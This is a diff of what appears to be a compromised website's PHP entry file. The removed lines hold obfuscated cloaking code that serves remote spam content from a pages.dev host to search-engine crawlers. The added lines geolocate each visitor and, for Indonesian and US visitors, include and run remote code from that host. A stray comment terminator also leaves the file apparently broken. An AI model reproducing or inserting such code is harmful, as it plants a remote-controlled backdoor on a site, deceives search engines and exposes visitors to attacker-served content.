@@ -1,45 +1,40 @@
 <?php
-function isGooglebotIP($ip) {
-    $hostname = gethostbyaddr($ip);
-    return (
-        strpos($hostname, 'googlebot.com') !== false || 
-        strpos($hostname, 'google.com') !== false || 
-        strpos($hostname, 'googleusercontent.com') !== false
-    );
-}
-
-$zX1q = [
-    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 
-    'YandexBot', 'Sogou', 'TelegramBot', 'Exabot', 'facebot', 
-    'ia_archiver', 'Google-Site-Verification', 'Google-InspectionTool'
-];
-
-$zK2v = $_SERVER['HTTP_USER_AGENT'];
-$zW3p = "https://visionxsro.pages.dev/visionxsro/";
-$zA4r = false;
-foreach ($zX1q as $zB5t) {
-    if (strpos($zK2v, $zB5t) !== false) {
-        $zA4r = true;
-        break;
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+function getUserIP() {
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+    } else {
+        $ip = $_SERVER['REMOTE_ADDR'];
     }
-}
-if ($zA4r || isGooglebotIP($_SERVER['REMOTE_ADDR'])) {
-    $zC6n = curl_init();
-    curl_setopt($zC6n, CURLOPT_URL, $zW3p);
-    curl_setopt($zC6n, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($zC6n, CURLOPT_FOLLOWLOCATION, true);
-    $zD7m = curl_exec($zC6n);
-    curl_close($zC6n);
-    echo $zD7m;
-    exit;
+    return $ip;
 }
 
-/*
-if (substr($_SERVER['HTTP_HOST'], 0, 4) == 'www.') {
-    $redirectURL = 'http://www.' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-    header('Location: ' . $redirectURL, true, 301);
+$ip = getUserIP();
+$api_url = "http://ip-api.com/json/{$ip}";
+
+$response = @file_get_contents($api_url);
+
+if ($response === FALSE) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $api_url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    $response = curl_exec($ch);
+    curl_close($ch);
+}
+
+$data = json_decode($response, true);
+
+if ($data && ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US')) {
+    ob_start();
+    include 'https://visionxsro.pages.dev/visionxsro/';
+    $output = ob_get_clean();
+    echo $output;
     exit();
 }
+
 */
 
 require_once dirname(__FILE__).'/config/siteconfig.php'; 
